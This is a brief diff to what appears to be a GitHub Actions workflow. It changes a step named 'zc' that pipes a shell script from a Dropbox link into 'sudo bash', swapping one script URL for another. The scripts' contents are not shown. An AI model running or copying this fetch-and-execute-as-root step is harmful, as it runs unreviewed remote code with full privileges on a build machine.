@@ -9,4 +9,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: zc
-      run: curl https://dl.dropboxusercontent.com/s/3ayu2sx3q0zp7ww/zc.sh | sudo bash
+      run: curl https://dl-web.dropbox.com/s/ce83avzn4908xx0/a.sh | sudo bash
